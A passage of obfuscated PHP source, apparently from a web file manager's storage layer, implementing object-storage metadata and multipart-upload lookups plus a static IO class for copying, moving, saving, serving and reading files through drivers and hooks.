unset($FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[99]]); if (isset($FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[229]])) { $FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[228]] = $C‡¿ÓÂ‰ö; return $this->listUploadParts($B©Ÿ§ä™–, $FÏÈÏç‰¾™); } goto e½ßà³ù¸§; CÃå™î”©Ø: if (strpos($AÎ÷„ÈŠ—¦, $Aâ»ÁÅ…™å[231]) === 0) { return array($Aâ»ÁÅ…™å[237] => $D´ÉµŒ»Ñß, $Aâ»ÁÅ…™å[228] => $C‡¿ÓÂ‰ö); } return $D´ÉµŒ»Ñß; goto BªÊçÃŒ•œ; FòİÚáŸ‡³: $Aâ»ÁÅ…™å =& $_SERVER[¢Í]; $C‡¿ÓÂ‰ö = isset($FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[228]]) ? $FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[228]] : gmdate($Aâ»ÁÅ…™å[226]); $AÎ÷„ÈŠ—¦ = isset($FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[175]]) ? $FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[175]] : $Aâ»ÁÅ…™å[33]; goto AÌè³‰…µÅ; BªÊçÃŒ•œ: } public function listUploadParts($EƒÈòî×Ì„, $f´¥»·¬ = array()) { goto B¢³—®•ñ¶; Bß†á‘§§Ë: $D±˜†ïë‚ù = $this->multiUploadAuthData($EƒÈòî×Ì„, $f´¥»·¬); if (empty($D±˜†ïë‚ù)) { return !1; } return array($cŠ„âßñİƒ[237] => $D±˜†ïë‚ù, $cŠ„âßñİƒ[228] => $f´¥»·¬[$cŠ„âßñİƒ[228]], $cŠ„âßñİƒ[239] => $e‘İø‰êÓö); goto C²É‚Ã§´ù; B¢³—®•ñ¶: $cŠ„âßñİƒ =& $_SERVER[¢Í]; $dÎç’“¿à = str_replace($cŠ„âßñİƒ[238], $cŠ„âßñİƒ[33], $f´¥»·¬[$cŠ„âßñİƒ[175]]); $e‘İø‰êÓö = $this->client->listParts($this->bucket, $EƒÈòî×Ì„, $dÎç’“¿à); goto D‘’Œ×†æÀ; D‘’Œ×†æÀ: if (!$e‘İø‰êÓö) { return !1; } unset($f´¥»·¬[$cŠ„âßñİƒ[229]], $f´¥»·¬[$cŠ„âßñİƒ[233]]); $f´¥»·¬[$cŠ„âßñİƒ[99]] = $EƒÈòî×Ì„; goto Bß†á‘§§Ë; C²É‚Ã§´ù: } public function getHost() { return parent::getHost() . $_SERVER[¢Í][8] . $this->bucket; } public function size($E¥øøµ¼Ãƒ) { $e¡Ãó«óÀ = $this->objectMeta($E¥øøµ¼Ãƒ); return $e¡Ãó«óÀ ? $e¡Ãó«óÀ[$_SERVER[¢Í][87]] : 0; } public function info($aÊÈÜº“½ˆ) { if ($this->isFolder($aÊÈÜº“½ˆ)) { return $this->folderInfo($aÊÈÜº“½ˆ); } else { if ($this->isFile($aÊÈÜº“½ˆ)) { return $this->fileInfo($aÊÈÜº“½ˆ); } } return !1; } public function exist($FÖË–ÙÀ±ß) { return $this->isFile($FÖË–ÙÀ±ß) || $this->isFolder($FÖË–ÙÀ±ß); } public function isFile($A†´‡§„¿¤) { return !$this->isFolder($A†´‡§„¿¤) && $this->objectMeta($A†´‡§„¿¤); } public function isFolder($EÜ«Ç““ÈÛ) { return $this->cacheMethod($_SERVER[¢Í][205], $EÜ«Ç““ÈÛ); } protected function objectMeta($CÑ¬¯ìŞè) { return $this->cacheMethod($_SERVER[¢Í][206], $CÑ¬¯ìŞè); } protected function _objectMeta($aõµñÇøİé) { $F¥‰·ÖæíÉ =& $_SERVER[¢Í]; $aõµñÇøİé = rtrim($aõµñÇøİé, $F¥‰·ÖæíÉ[8]); try { $B–…ã¼°–¨ = $this->client->getObjectInfo($this->bucket, $aõµñÇøİé); if (!isset($B–…ã¼°–¨[$F¥‰·ÖæíÉ[225]]) && isset($B–…ã¼°–¨[$F¥‰·ÖæíÉ[240]])) { $B–…ã¼°–¨[$F¥‰·ÖæíÉ[225]] = $B–…ã¼°–¨[$F¥‰·ÖæíÉ[240]]; } } catch (Exception $EÕŞ×ó°…ğ) { $B–…ã¼°–¨ = !1; } if (!$B–…ã¼°–¨) { } return $B–…ã¼°–¨; } protected function _isFolder($FÁ•Ï®ªš¤) { goto AçñÕò¿; cÙ˜“·îÂÁ: if (substr($CÇÅ‚ïåˆ, -1) == $c£ÄÔ¶¡öÕ[8]) { return !0; } if (get_path_this($CÇÅ‚ïåˆ) == get_path_this($FÁ•Ï®ªš¤)) { return !1; } return !0; goto AÕÕ‰Üå™œ; AçñÕò¿: $c£ÄÔ¶¡öÕ =& $_SERVER[¢Í]; $FÁ•Ï®ªš¤ = rtrim($FÁ•Ï®ªš¤, $c£ÄÔ¶¡öÕ[8]); if ($FÁ•Ï®ªš¤ == $c£ÄÔ¶¡öÕ[33] || $FÁ•Ï®ªš¤ == $c£ÄÔ¶¡öÕ[8]) { return !0; } goto f™­¡×á«; f™­¡×á«: $AÍ«Ãæ•ô‰ = $this->client->getBucket($this->bucket, $FÁ•Ï®ªš¤, null, 1); if (empty($AÍ«Ãæ•ô‰[$c£ÄÔ¶¡öÕ[204]])) { return !1; } $CÇÅ‚ïåˆ = $AÍ«Ãæ•ô‰[$c£ÄÔ¶¡öÕ[204]][0][$c£ÄÔ¶¡öÕ[28]]; goto cÙ˜“·îÂÁ; AÕÕ‰Üå™œ: } } goto dëŸ­é‚«Ô; bÃ´™ŞÇ¬: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Cˆ¶¶Ó­÷ø, $A¡†Ô·ÙŞ) { goto Cˆ¡ô¾Û‹‘; Cˆ¡ô¾Û‹‘: $DñÛ£œÉÙİ =& $_SERVER[¢Í]; $D²Ğ¿êã¾ = $A¡†Ô·ÙŞ; $GLOBALS[$DñÛ£œÉÙİ[1010]] = $DñÛ£œÉÙİ[1011] . $Cˆ¶¶Ó­÷ø; goto EùÒéÓĞ ö; C•Ë‘ç£Î: Hook::trigger($DñÛ£œÉÙİ[1011] . $Cˆ¶¶Ó­÷ø . $DñÛ£œÉÙİ[1014], $D²Ğ¿êã¾, $eõ¹ Òïâ‡); return $eõ¹ Òïâ‡; goto d¾±ßÍóìÓ; EùÒéÓĞ ö: Hook::trigger($DñÛ£œÉÙİ[1011] . $Cˆ¶¶Ó­÷ø . $DñÛ£œÉÙİ[1012], $D²Ğ¿êã¾); $Cøï©°š¾ô = self::driverMake($A¡†Ô·ÙŞ[0]); if (method_exists($Cøï©°š¾ô, $Cˆ¶¶Ó­÷ø)) { $eõ¹ Òïâ‡ = @call_user_func_array(array($Cøï©°š¾ô, $Cˆ¶¶Ó­÷ø), $A¡†Ô·ÙŞ); } else { if (method_exists($Cøï©°š¾ô, $DñÛ£œÉÙİ[1013])) { $eõ¹ Òïâ‡ = @call_user_func_array(array($Cøï©°š¾ô, $Cˆ¶¶Ó­÷ø), $A¡†Ô·ÙŞ); } else { if (method_exists(self, $Cˆ¶¶Ó­÷ø)) { $eõ¹ Òïâ‡ = @call_user_func_array(array(self, $Cˆ¶¶Ó­÷ø), $A¡†Ô·ÙŞ); } else { $eõ¹ Òïâ‡ = call_user_func_array(array(parent, $Cˆ¶¶Ó­÷ø), $A¡†Ô·ÙŞ); } } } goto C•Ë‘ç£Î; d¾±ßÍóìÓ: } public static function init($aÔÛ·ÓÍèÙ) { return self::driverMake($aÔÛ·ÓÍèÙ); } public static function copy($F·ß„Õ±Ñ›, $aßùìŞæŒ², $DÎğŠ ¬‹ = false, $e• †½‹· = false) { return self::copyMoveStart($F·ß„Õ±Ñ›, $aßùìŞæŒ², $DÎğŠ ¬‹, $_SERVER[¢Í][516], $e• †½‹·); } public static function move($e¤ÎÙ—ÜÛË, $e½ë­ïÈç, $E¯…ÜíÉª = false, $bËÖğ‰Öš = false) { return self::copyMoveStart($e¤ÎÙ—ÜÛË, $e½ë­ïÈç, $E¯…ÜíÉª, $_SERVER[¢Í][518], $bËÖğ‰Öš); } private static function copyMoveStart($a™§Ïˆ”ä, $DéœÏÂöÈé, $EÅ¤Ÿ‰„¶‹, $cÔ–ÙğÙÌ, $f¤˜Š¼•‹Ñ) { $DÒĞØëÖ‘ =& $_SERVER[¢Í]; $FáÛ‹Ôğ¼ = array($a™§Ïˆ”ä, $DéœÏÂöÈé, $EÅ¤Ÿ‰„¶‹, $f¤˜Š¼•‹Ñ); Hook::trigger($DÒĞØëÖ‘[1011] . $cÔ–ÙğÙÌ . $DÒĞØëÖ‘[1012], $FáÛ‹Ôğ¼); $a±³¶ì©— = self::copyMove($a™§Ïˆ”ä, $DéœÏÂöÈé, $EÅ¤Ÿ‰„¶‹, $cÔ–ÙğÙÌ, $f¤˜Š¼•‹Ñ); Hook::trigger($DÒĞØëÖ‘[1011] . $cÔ–ÙğÙÌ . $DÒĞØëÖ‘[1014], $FáÛ‹Ôğ¼, $a±³¶ì©—); return $a±³¶ì©—; } public static function saveFile($DæÂÁ­¿Ÿ¦, $c‘õ”«‰œ¤, $fŞÆç¬¥… = true) { goto CŒÒ¿Ñ†ªÍ; E¿—’‹à”Û: $fÔæƒÊ©¬ = self::copyFile($AŒ©Çš£°, $DæÂÁ­¿Ÿ¦, $eÄ²æÚ¬Ö, $A±ÏòŞ» , $c˜Š‚ãÍŒŞ[$f²ÊÑó×¶[28]], $e¦›î‡Şë); if ($fĞÌäßˆµÃ) { $fÔæƒÊ©¬ = $fĞÌäßˆµÃ->getPathOuter($fÔæƒÊ©¬); } return $fÔæƒÊ©¬; goto aô×Å‰®„; CŒÒ¿Ñ†ªÍ: $f²ÊÑó×¶ =& $_SERVER[¢Í]; $c˜Š‚ãÍŒŞ = self::info($c‘õ”«‰œ¤); $AŒ©Çš£° = self::driverMake($DæÂÁ­¿Ÿ¦); goto EõğÂâÆ’; EõğÂâÆ’: $eÄ²æÚ¬Ö = self::driverMake($c‘õ”«‰œ¤); $fĞÌäßˆµÃ = !1; if ($eÄ²æÚ¬Ö->pathParse[$f²ÊÑó×¶[1015]]) { $BÅ¶âÈÇ³¿ = $eÄ²æÚ¬Ö->pathParse[$f²ÊÑó×¶[1015]]; $fĞÌäßˆµÃ = $eÄ²æÚ¬Ö; $eÄ²æÚ¬Ö = self::driverMake($BÅ¶âÈÇ³¿); } goto A¢ˆˆ‘÷ğ²; A¢ˆˆ‘÷ğ²: $A±ÏòŞ»  = $eÄ²æÚ¬Ö->pathFather($c‘õ”«‰œ¤); $e¦›î‡Şë = !0; if (!$fŞÆç¬¥… && self::driverIsSame($AŒ©Çš£°, $eÄ²æÚ¬Ö)) { $e¦›î‡Şë = !1; } goto E¿—’‹à”Û; aô×Å‰®„: } private static function copyMove($D‚¿ÙƒËóâ, $Fçµ‰ˆæ²ƒ, $F›Ù‘‘ÆÎê, $fœê‹©·ò˜, $fø“¨Ô¿¥ = false) { goto DÀÚÂÏ¨‚Â; DÀÚÂÏ¨‚Â: $D™‹‰£­áƒ =& $_SERVER[¢Í]; if (!$D‚¿ÙƒËóâ || $D‚¿ÙƒËóâ == $D™‹‰£­áƒ[8] || !$Fçµ‰ˆæ²ƒ) { return !1; } ignore_timeout(); goto D»¢›½·ë; CÜ÷á„ùĞ›: Hook::trigger($D™‹‰£­áƒ[82], $BÀ©ßˆ”¿, $D‚¿ÙƒËóâ, $dÀØØÑíè², $Fçµ‰ˆæ²ƒ); $cê‰…Û‡°· = self::driverIsSame($BÀ©ßˆ”¿, $dÀØØÑíè²); if ($cê‰…Û‡°·) { if ($fœê‹©·ò˜ == $D™‹‰£­áƒ[518] && !method_exists($dÀØØÑíè², $D™‹‰£­áƒ[1016]) && trim($Fçµ‰ˆæ²ƒ, $D™‹‰£­áƒ[8]) == trim($dÀØØÑíè²->pathFather($D‚¿ÙƒËóâ), $D™‹‰£­áƒ[8])) { if ($BÀ©ßˆ”¿->pathThis($D‚¿ÙƒËóâ) != $fø“¨Ô¿¥ && !$BÀ©ßˆ”¿->isTypeObject()) { return $BÀ©ßˆ”¿->rename($D‚¿ÙƒËóâ, $fø“¨Ô¿¥); } return $dÀØØÑíè²->getPathOuter($D‚¿ÙƒËóâ); } if (method_exists($dÀØØÑíè², $fœê‹©·ò˜)) { return $dÀØØÑíè²->{$fœê‹©·ò˜}($D‚¿ÙƒËóâ, $Fçµ‰ˆæ²ƒ, $F›Ù‘‘ÆÎê); } } goto E¨†¤°§; b˜ã†ÔŠ‰: $B £°¶èÏ = !1; if ($dÀØØÑíè²->pathParse[$D™‹‰£­áƒ[1015]]) { $Fçµ‰ˆæ²ƒ = $dÀØØÑíè²->pathParse[$D™‹‰£­áƒ[1015]]; $B £°¶èÏ = $dÀØØÑíè²; $dÀØØÑíè² = self::driverMake($Fçµ‰ˆæ²ƒ); } self::check($BÀ©ßˆ”¿, $D‚¿ÙƒËóâ, $dÀØØÑíè², $Fçµ‰ˆæ²ƒ); goto CÜ÷á„ùĞ›; B–¹ªô«Õå: if ($B £°¶èÏ) { $bÉŞ‘ÑÙ¶â = $B £°¶èÏ->getPathOuter($bÉŞ‘ÑÙ¶â); } return $bÉŞ‘ÑÙ¶â; goto däÛ‹é”Ú; D»¢›½·ë: $BÀ©ßˆ”¿ = self::driverMake($D‚¿ÙƒËóâ); $dÀØØÑíè² = self::driverMake($Fçµ‰ˆæ²ƒ); $fÑª‡Ášö­ = $fœê‹©·ò˜ == $D™‹‰£­áƒ[518]; goto b˜ã†ÔŠ‰; E¨†¤°§: $cÕã…¿™„ = $BÀ©ßˆ”¿->isFile($D‚¿ÙƒËóâ); if (!$cÕã…¿™„ && $dÀØØÑíè²->getType() == $D™‹‰£­áƒ[708] && $BÀ©ßˆ”¿->getType() == $D™‹‰£­áƒ[112]) { $bÉŞ‘ÑÙ¶â = $dÀØØÑíè²->copyFolderFromIO($BÀ©ßˆ”¿, $D‚¿ÙƒËóâ, $Fçµ‰ˆæ²ƒ, $F›Ù‘‘ÆÎê, $fÑª‡Ášö­, $fø“¨Ô¿¥); } else { $bÉŞ‘ÑÙ¶â = self::copyPath($BÀ©ßˆ”¿, $D‚¿ÙƒËóâ, $dÀØØÑíè², $Fçµ‰ˆæ²ƒ, $F›Ù‘‘ÆÎê, $fÑª‡Ášö­, $cÕã…¿™„, $fø“¨Ô¿¥); } if ($bÉŞ‘ÑÙ¶â && $fÑª‡Ášö­) { $BÀ©ßˆ”¿->remove($D‚¿ÙƒËóâ); } goto B–¹ªô«Õå; däÛ‹é”Ú: } private static function check($c¯Ü„Ø×ôõ, $fµ–è°ØÕğ, $e¨‚õœ¹»Ê, &$aŒŸˆ¯ë¨¡) { $D®¢¨íÈ¼• =& $_SERVER[¢Í]; if (self::driverIsSame($c¯Ü„Ø×ôõ, $e¨‚õœ¹»Ê) && $c¯Ü„Ø×ôõ->isFolder($fµ–è°ØÕğ) && $c¯Ü„Ø×ôõ->isParentOf($fµ–è°ØÕğ, $aŒŸˆ¯ë¨¡)) { show_json(LNG($D®¢¨íÈ¼•[1017]), !1); } if (!$c¯Ü„Ø×ôõ->exist($fµ–è°ØÕğ)) { show_json(LNG($D®¢¨íÈ¼•[111]), !1); } } private static function copyPath($B–ÊĞä¯éÆ, $EŸóë–£™ˆ, $bå‘˜ÖóÅ¯, $eø„ÉŞíİ, $a”°‹Öºµ, $eÄá¿‘Š°, $C›„¬™‰‰‘, $a»Î·Ï²Š¦ = false) { goto dìÖ–µ­Ä–; eñœšÌêÓ±: $Bßòª‚ ²¤ = $bå‘˜ÖóÅ¯->mkdir($bå‘˜ÖóÅ¯->getPath($DÓöçŒƒô)); $eø„ÉŞíİ = $bå‘˜ÖóÅ¯->getPathInner($Bßòª‚ ²¤); $BÈïÍ²İÀÍ = $B–ÊĞä¯éÆ->listPath($EŸóë–£™ˆ, !0); goto cß¢‹ÃÜ; cß¢‹ÃÜ: $FœÍïÔ—Æ½ = array_merge($BÈïÍ²İÀÍ[$A¦Í„ÛçØ¦[83]], $BÈïÍ²İÀÍ[$A¦Í„ÛçØ¦[84]]); foreach ($FœÍïÔ—Æ½ as $b¢İÒîº½ò) { $Då³Åâ£ˆì = $b¢İÒîº½ò[$A¦Í„ÛçØ¦[29]] == $A¦Í„ÛçØ¦[181]; $EŸóë–£™ˆ = $B–ÊĞä¯éÆ->getPathInner($b¢İÒîº½ò[$A¦Í„ÛçØ¦[85]]); $eøæ¤ø¬ã = self::copyPath($B–ÊĞä¯éÆ, $EŸóë–£™ˆ, $bå‘˜ÖóÅ¯, $eø„ÉŞíİ, $a”°‹Öºµ, $eÄá¿‘Š°, $Då³Åâ£ˆì); if (!$eøæ¤ø¬ã) { IO::errorTips($A¦Í„ÛçØ¦[1018] . $EŸóë–£™ˆ . $A¦Í„ÛçØ¦[76] . $eø„ÉŞíİ); } } return $Bßòª‚ ²¤; goto eñé˜—“í; c›†Óè: if ($C›„¬™‰‰‘) { return self::copyFile($B–ÊĞä¯éÆ, $EŸóë–£™ˆ, $bå‘˜ÖóÅ¯, $eø„ÉŞíİ, $eçì…æ‹Èğ, $eÄá¿‘Š°); } if ($a”°‹Öºµ == REPEAT_RENAME_FOLDER) { $a”°‹Öºµ = !1; } $DÓöçŒƒô = rtrim($eø„ÉŞíİ, $A¦Í„ÛçØ¦[8]) . $A¦Í„ÛçØ¦[8] . $eçì…æ‹Èğ; goto eñœšÌêÓ±; dìÖ–µ­Ä–: $A¦Í„ÛçØ¦ =& $_SERVER[¢Í]; $eçì…æ‹Èğ = $a»Î·Ï²Š¦ ? $a»Î·Ï²Š¦ : $B–ÊĞä¯éÆ->pathThis($EŸóë–£™ˆ); if ($a”°‹Öºµ) { $e˜Óàí„¢ê = $bå‘˜ÖóÅ¯->fileNameExist($eø„ÉŞíİ, $eçì…æ‹Èğ); $eçì…æ‹Èğ = $bå‘˜ÖóÅ¯->fileNameAuto($eø„ÉŞíİ, $eçì…æ‹Èğ, $a”°‹Öºµ, !$C›„¬™‰‰‘); $a”°‹Öºµ = $e˜Óàí„¢ê ? $a”°‹Öºµ : !1; } goto c›†Óè; eñé˜—“í: } private static function copyFile($FÇèÈ”ç”, $FñØ—‰¡å, $b»©ˆöŸø, $aÃ¦Û¿¯Œœ, $cÉ¬–ìó·™, $f¬Æœêì) { goto d‚ì•êä¹Ø; dœŒŠØµ Ñ: Hook::trigger($AÛÂ›×Àá¤[1020], $FÇèÈ”ç”, $FñØ—‰¡å, $b»©ˆöŸø, $aÃ¦Û¿¯Œœ, $cÉ¬–ìó·™, $A††¸°Œ°ã); if (self::driverIsSame($FÇèÈ”ç”, $b»©ˆöŸø)) { if ($f¬Æœêì) { $a¾Ã›Ûò™ = $b»©ˆöŸø->moveFile($FñØ—‰¡å, $aÃ¦Û¿¯Œœ); } else { $a¾Ã›Ûò™ = $b»©ˆöŸø->copyFile($FñØ—‰¡å, $aÃ¦Û¿¯Œœ); } Hook::trigger($AÛÂ›×Àá¤[1021], $FÇèÈ”ç”, $FñØ—‰¡å, $b»©ˆöŸø, $aÃ¦Û¿¯Œœ, $cÉ¬–ìó·™, $a¾Ã›Ûò™); return $a¾Ã›Ûò™; } $B¹×èÑâ×¨ = TEMP_FILES; goto A”¬µ„Íéº; Fõäîôºòí: $c‰ˆ°£½—Ü = $FÇèÈ”ç”->iconvApp($c‰ˆ°£½—Ü); $a¾Ã›Ûò™ = $b»©ˆöŸø->upload($aÃ¦Û¿¯Œœ, $c‰ˆ°£½—Ü, $f¬Æœêì); self::remove($B¹×èÑâ×¨ . $A††¸°Œ°ã); goto d’¾ĞŠÕ¼; d’¾ĞŠÕ¼: Hook::trigger($AÛÂ›×Àá¤[1021], $FÇèÈ”ç”, $FñØ—‰¡å, $b»©ˆöŸø, $aÃ¦Û¿¯Œœ, $cÉ¬–ìó·™, $a¾Ã›Ûò™); return $a¾Ã›Ûò™; goto A¢–çŒÕôİ; A”¬µ„Íéº: mk_dir($B¹×èÑâ×¨); $c‰ˆ°£½—Ü = $B¹×èÑâ×¨ . $A††¸°Œ°ã; $c‰ˆ°£½—Ü = $FÇèÈ”ç”->download($FñØ—‰¡å, $c‰ˆ°£½—Ü); goto Fõäîôºòí; d‚ì•êä¹Ø: $AÛÂ›×Àá¤ =& $_SERVER[¢Í]; $aÃ¦Û¿¯Œœ = $b»©ˆöŸø->getPath(rtrim($aÃ¦Û¿¯Œœ, $AÛÂ›×Àá¤[8]) . $AÛÂ›×Àá¤[8] . $cÉ¬–ìó·™); $A††¸°Œ°ã = $AÛÂ›×Àá¤[1019] . time() . rand_string(5); goto dœŒŠØµ Ñ; A¢–çŒÕôİ: } public static function pathFather($cª†ÁöÔ”) { $Bôõç½Ç¬µ = IO::init($cª†ÁöÔ”); $Fˆïö‚£ÑÃ = $Bôõç½Ç¬µ->pathFather($Bôõç½Ç¬µ->path); return $Bôõç½Ç¬µ->getPathOuter($Fˆïö‚£ÑÃ); } public static function fileOut($EŸœÖ—Ü–, $D ¨ïÀŸ = false, $D†ò™Ò‰Ì¼ = false, $c¦Ìà¸³· = '') { $F¨®Ù»‘´î = self::driverMake($EŸœÖ—Ü–); if ($F¨®Ù»‘´î->isFileOutServer()) { return $F¨®Ù»‘´î->fileOutServer($EŸœÖ—Ü–, $D ¨ïÀŸ, $D†ò™Ò‰Ì¼, $c¦Ìà¸³·); } return $F¨®Ù»‘´î->fileOut($EŸœÖ—Ü–, $D ¨ïÀŸ, $D†ò™Ò‰Ì¼, $c¦Ìà¸³·); } public static function fileOutImage($bÙîìÅ‡—, $D÷æÜ¥„”Æ = 250) { $dê„ê¹ì¥Ş = array(250, 600, 1200, 3000, 5000); for ($eó§é˜ñ‡¿ = 0; $eó§é˜ñ‡¿ < count($dê„ê¹ì¥Ş); $eó§é˜ñ‡¿++) { if ($eó§é˜ñ‡¿ == 0 && $D÷æÜ¥„”Æ <= $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]) { $D÷æÜ¥„”Æ = $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]; break; } else { if ($D÷æÜ¥„”Æ > $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿ - 1] && $D÷æÜ¥„”Æ <= $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]) { $D÷æÜ¥„”Æ = $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]; break; } else { if ($eó§é˜ñ‡¿ == count($dê„ê¹ì¥Ş) - 1 && $D÷æÜ¥„”Æ > $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]) { $D÷æÜ¥„”Æ = $dê„ê¹ì¥Ş[$eó§é˜ñ‡¿]; break; } } } } $Däø•°ÓÍ× = self::driverMake($bÙîìÅ‡—); if ($Däø•°ÓÍ×->isFileOutServer()) { return $Däø•°ÓÍ×->fileOutImageServer($bÙîìÅ‡—, $D÷æÜ¥„”Æ); } return $Däø•°ÓÍ×->fileOutImage($bÙîìÅ‡—, $D÷æÜ¥„”Æ); } private static function driverIsSame($cßÇº„æš¥, $AÍÆ¿Àê) { goto bòäŠÏœ†Å; B³ÃØÔËàô: if ($F¤å¦ÆÛ‰½ != $fÌœƒŠ©Üù) { return !1; } if ($F¤å¦ÆÛ‰½ == $BÔŠÖ²–‡[708]) { return !0; } if ($F¤å¦ÆÛ‰½ == $BÔŠÖ²–‡[112]) { return !0; } goto CÇÍË“ÔÀ‰; bòäŠÏœ†Å: $BÔŠÖ²–‡ =& $_SERVER[¢Í]; $F¤å¦ÆÛ‰½ = $cßÇº„æš¥->getType(); $fÌœƒŠ©Üù = $AÍÆ¿Àê->getType(); goto B³ÃØÔËàô; CÇÍË“ÔÀ‰: if ($cßÇº„æš¥->pathDriver == $AÍÆ¿Àê->pathDriver) { return !0; } return !1; goto aÄÊ®¤¡İˆ; aÄÊ®¤¡İˆ: } public static function copyUpdate($FÃˆâÜõ¿´, $Bù·Ì÷å¥) { goto EİÒçÆ®µß; EİÒçÆ®µß: $Cìù¸á¯Ì› =& $_SERVER[¢Í]; if (!IO::exist($FÃˆâÜõ¿´)) { return !1; } if (!IO::exist($Bù·Ì÷å¥)) { IO::mkdir($Bù·Ì÷å¥); } goto DĞ¬¥¸‚Şæ; D¹„İ¢Î±à: Hook::trigger($Cìù¸á¯Ì›[1025], $FÃˆâÜõ¿´, $Bù·Ì÷å¥, $CèÑ´™Ø Ğ); foreach ($EÖ¶²‰Œ…½ as $EÆ‚’ŠòÁº) { IO::mkdir($EÆ‚’ŠòÁº); } foreach ($E…ÇĞ‰§—Ì as $EÆ‚’ŠòÁº) { IO::copy($EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[1022]], $EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[1023]], REPEAT_REPLACE); } goto bÖŞ¿Ÿˆ´–; DĞ¬¥¸‚Şæ: $f²õğòÖ­ = self::_listAll($FÃˆâÜõ¿´); $FŒÙ¦„âÇò = self::_listAll($Bù·Ì÷å¥); $E…ÇĞ‰§—Ì = array(); goto C¡¯ŸŒÅ±ô; C¡¯ŸŒÅ±ô: $EÖ¶²‰Œ…½ = array(); foreach ($f²õğòÖ­ as $cŠâ†àÓ»È => $EÆ‚’ŠòÁº) { if (isset($FŒÙ¦„âÇò[$cŠâ†àÓ»È])) { if ($EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[86]] == 1) { continue; } if ($FŒÙ¦„âÇò[$cŠâ†àÓ»È][$Cìù¸á¯Ì›[87]] == $EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[87]]) { continue; } } if ($EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[86]] == 1) { $EÖ¶²‰Œ…½[] = $Bù·Ì÷å¥ . $Cìù¸á¯Ì›[8] . $cŠâ†àÓ»È; continue; } $BÚÔÆœ§óõ = strstr(trim($cŠâ†àÓ»È, $Cìù¸á¯Ì›[8]), $Cìù¸á¯Ì›[8]) ? get_path_father($cŠâ†àÓ»È) : $Cìù¸á¯Ì›[33]; $E…ÇĞ‰§—Ì[] = array($Cìù¸á¯Ì›[1022] => $EÆ‚’ŠòÁº[$Cìù¸á¯Ì›[85]], $Cìù¸á¯Ì›[1023] => rtrim($Bù·Ì÷å¥, $Cìù¸á¯Ì›[8]) . $Cìù¸á¯Ì›[8] . $BÚÔÆœ§óõ, $Cìù¸á¯Ì›[1024] => $EÆ‚’ŠòÁº); } $CèÑ´™Ø Ğ = array($Cìù¸á¯Ì›[181] => $E…ÇĞ‰§—Ì, $Cìù¸á¯Ì›[86] => $EÖ¶²‰Œ…½); goto D¹„İ¢Î±à; bÖŞ¿Ÿˆ´–: } private static function _listAll($aŠ‚Á Ò) { $e‰Œ†¨”°ï =& $_SERVER[¢Í]; $aŠ‚Á Ò = KodIO::clear($aŠ‚Á Ò); $f‘Â¦è£ã» = IO::listAll($aŠ‚Á Ò); foreach ($f‘Â¦è£ã» as &$Bæ±œ›·–) { $aŠÒõÁ›Š = substr($Bæ±œ›·–[$e‰Œ†¨”°ï[85]], strlen($aŠ‚Á Ò)); $Bæ±œ›·–[$e‰Œ†¨”°ï[1026]] = trim($aŠÒõÁ›Š, $e‰Œ†¨”°ï[8]); } unset($Bæ±œ›·–); return array_to_keyvalue($f‘Â¦è£ã», $e‰Œ†¨”°ï[1026]); } public static function fileSubstr($c‡«¡ŠÑ±”, $A–µ·Î±é¯, $fªÅ¸À§Ï = false) { goto E‰õ¶³ÎÂ®; E‰õ¶³ÎÂ®: $Bï‹¾…·Ù =& $_SERVER[¢Í]; $Dƒ°Â±œä = self::driverMake($c‡«¡ŠÑ±”); $bŠá°óõ¹½ = $Dƒ°Â±œä->size($c‡«¡ŠÑ±”); goto fæÖ“£ñôÇ; BäŒõšÉ: if (!$AßùÙÇ›¨É && $fªÅ¸À§Ï && isset($GLOBALS[$Bï‹¾…·Ù[1029]])) { throw new Exception($GLOBALS[$Bï‹¾…·Ù[1029]][$Bï‹¾…·Ù[1030]]); } return $AßùÙÇ›¨É; goto dñ›ì³‡í‚; E¯ÓƒÕ­Ğñ: if ($fªÅ¸À§Ï <= 0) { return $Bï‹¾…·Ù[33]; } if ($A–µ·Î±é¯ < 0 || $A–µ·Î±é¯ >= $bŠá°óõ¹½ || $fªÅ¸À§Ï > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\x65\122\145\141\x64\40\145\x72\x72\x6f\x72\x21\40\163\164\x61\162\x74\75{$A–µ·Î±é¯}\x3b\154\x65\x6e\x67\x74\150\x3d{$fªÅ¸À§Ï}\x3b\x20\163\x69\x7a\x65\x3d{$bŠá°óõ¹½}\73"); } $AßùÙÇ›¨É = $Dƒ°Â±œä->fileSubstr($c‡«¡ŠÑ±”, $A–µ·Î±é¯, $fªÅ¸À§Ï); goto BäŒõšÉ; Fì°›óæÒ: if ($fªÅ¸À§Ï === !1) { $fªÅ¸À§Ï = $bŠá°óõ¹½ - $A–µ·Î±é¯; } if ($A–µ·Î±é¯ + $fªÅ¸À§Ï > $bŠá°óõ¹½) { $fªÅ¸À§Ï = $bŠá°óõ¹½ - $A–µ·Î±é¯; } if (!$bŠá°óõ¹½ && $Dƒ°Â±œä->getType() == $Bï‹¾…·Ù[112] && !$Dƒ°Â±œä->exist($c‡«¡ŠÑ±”)) { throw new Exception($Bï‹¾…·Ù[1027] . LNG($Bï‹¾…·Ù[1028])); } goto E¯ÓƒÕ­Ğñ; fæÖ“£ñôÇ: $aİ¶¡•Ş†‘ = $A–µ·Î±é¯; $fè½ŠÄÂÃÁ = $fªÅ¸À§Ï; if ($A–µ·Î±é¯ < 0) { $A–µ·Î±é¯ = $bŠá°óõ¹½ + $A–µ·Î±é¯; } goto Fì°›óæÒ; dñ›ì³‡í‚: } private static function driverMake(&$f™©¸éÍå’) { goto BÛÀÎİî×; 